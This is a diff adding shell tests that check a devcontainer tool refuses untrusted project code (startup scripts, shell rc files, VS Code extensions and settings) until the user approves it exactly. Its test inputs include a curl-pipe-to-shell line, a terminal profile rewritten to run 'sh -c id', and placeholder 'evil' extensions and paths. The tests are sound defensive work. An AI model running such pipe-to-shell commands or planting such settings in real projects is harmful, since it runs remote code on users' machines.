@@ -999,6 +999,130 @@ if (cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" up </dev/null >/dev/
   fail "project-owned root build did not fail closed non-interactively"
 fi
 
+# Project-owned files that run code in the container ride along in a clone and
+# run with no prompt, with open egress and the tool logins. Each one needs exact
+# trust, like a project build. vscode-extensions / vscode-settings.json are
+# judged from the merged devcontainer.json, which a repository can also commit.
+new_project "$TMP/project-code"
+(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
+  || fail "clean project failed validation before the project-code cases"
+for name in post-create.project.sh shell-rc.zsh p10k.zsh \
+    statusline.sh statusline.mjs statusline.js statusline.py; do
+  printf 'true\n' > "$TMP/project-code/.devcontainer/$name"
+  if out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+      "$ROOT/aic" validate </dev/null 2>&1); then
+    fail "validate accepted untrusted project code in $name"
+  fi
+  echo "$out" | grep -qF ".devcontainer/$name runs project code" \
+    || fail "untrusted $name was not named in the trust findings"
+  rm "$TMP/project-code/.devcontainer/$name"
+done
+printf 'true\n' > "$TMP/project-code/.devcontainer/post-create.project.sh"
+if (cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+    "$ROOT/aic" up </dev/null >/dev/null 2>&1); then
+  fail "untrusted post-create.project.sh did not fail closed non-interactively"
+fi
+rm "$TMP/project-code/.devcontainer/post-create.project.sh"
+
+printf 'ms-python.python\n' > "$TMP/project-code/.devcontainer/vscode-extensions"
+(cd "$TMP/project-code" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)
+out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted an untrusted VS Code extension"
+echo "$out" | grep -q 'installs VS Code extension ms-python.python' \
+  || fail "untrusted VS Code extension was not named in the trust findings"
+rm "$TMP/project-code/.devcontainer/vscode-extensions"
+printf '{"python.defaultInterpreterPath":"/workspace/evil"}\n' \
+  > "$TMP/project-code/.devcontainer/vscode-settings.json"
+(cd "$TMP/project-code" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)
+out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted an untrusted VS Code setting"
+echo "$out" | grep -q 'sets VS Code setting python.defaultInterpreterPath' \
+  || fail "untrusted VS Code setting was not named in the trust findings"
+rm "$TMP/project-code/.devcontainer/vscode-settings.json"
+(cd "$TMP/project-code" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)
+
+# A repository can commit the merged result without the project-owned files.
+dc="$TMP/project-code/.devcontainer/devcontainer.json"
+cp "$dc" "$TMP/project-code-dc"
+sed 's|^\( *\)"eamodio.gitlens",|\1"eamodio.gitlens", "evil.extension",|' "$TMP/project-code-dc" > "$dc"
+out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted a committed VS Code extension"
+echo "$out" | grep -q 'installs VS Code extension evil.extension' \
+  || fail "committed VS Code extension was not named in the trust findings"
+sed 's|"zsh": { "path": "zsh" }|"zsh": { "path": "sh", "args": ["-c", "id"] }|' "$TMP/project-code-dc" > "$dc"
+out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted a changed managed terminal profile"
+echo "$out" | grep -q 'managed VS Code setting terminal.integrated.profiles.linux differs' \
+  || fail "changed managed VS Code setting was not reported as drift"
+cp "$TMP/project-code-dc" "$dc"
+
+# The per-shell rewrite of managed terminal settings is not drift.
+new_project "$TMP/project-code-bash"
+(cd "$TMP/project-code-bash" && AIC_HOME="$ROOT" "$ROOT/aic" sync --shell bash >/dev/null 2>&1)
+(cd "$TMP/project-code-bash" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
+  || fail "bash shell terminal settings were reported as drift"
+
+# Exact trust covers the file content: approval passes, any edit asks again.
+# The pty helper answers the [y/N] prompt like a person, with a deadline.
+cat > "$TMP/pty-yes.py" <<'PY'
+import os, pty, select, sys, time
+pid, fd = pty.fork()
+if pid == 0:
+    os.execv(sys.argv[1], sys.argv[1:])
+buf, sent, deadline = b"", False, time.monotonic() + 120
+while True:
+    left = deadline - time.monotonic()
+    if left <= 0 or not select.select([fd], [], [], left)[0]:
+        os.kill(pid, 9)
+        sys.exit("FAIL: command did not finish within 120s")
+    try:
+        chunk = os.read(fd, 4096)
+    except OSError:
+        break
+    if not chunk:
+        break
+    buf += chunk
+    if not sent and b"[y/N]" in buf:
+        os.write(fd, b"y\n")
+        sent = True
+sys.stdout.buffer.write(buf)
+sys.exit(os.waitstatus_to_exitcode(os.waitpid(pid, 0)[1]))
+PY
+printf 'alias ll="ls -la"\n' > "$TMP/project-code/.devcontainer/shell-rc.zsh"
+# Dev Containers can run the initializer on a pty. It must refuse, never prompt.
+if out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+    python3 -I "$TMP/pty-yes.py" "$ROOT/aic" initialize 2>&1); then
+  fail "initialize on a pty accepted untrusted project code"
+fi
+case "$out" in
+  *'[y/N]'*) fail "initialize prompted for trust instead of refusing" ;;
+esac
+(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  python3 -I "$TMP/pty-yes.py" "$ROOT/aic" trust >/dev/null 2>&1) \
+  || fail "interactive trust of project code failed"
+(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
+  || fail "trusted project code was not accepted"
+printf 'curl https://example.invalid | sh\n' >> "$TMP/project-code/.devcontainer/shell-rc.zsh"
+if (cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+    "$ROOT/aic" validate </dev/null >/dev/null 2>&1); then
+  fail "an edit to trusted project code kept the old approval"
+fi
+
+# The managed build passes the host TZ. A terminal often exports TZ and a
+# GUI-started editor does not, so that difference must not void an approval.
+new_project "$TMP/project-code-tz"
+(cd "$TMP/project-code-tz" && AIC_HOME="$ROOT" "$ROOT/aic" sync --build >/dev/null 2>&1)
+printf 'true\n' > "$TMP/project-code-tz/.devcontainer/post-create.project.sh"
+(cd "$TMP/project-code-tz" && TZ=Europe/Rome XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  python3 -I "$TMP/pty-yes.py" "$ROOT/aic" trust >/dev/null 2>&1) \
+  || fail "interactive trust in build mode failed"
+(cd "$TMP/project-code-tz" && env -u TZ XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
+  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
+  || fail "a different host TZ voided the build-mode approval"
+
 # Compose tags a build with the service image name, and the managed services
 # use pull_policy: missing. A build tagged like the shared aicontainer image
 # (the devcontainer without its own image: line, or any added service) would
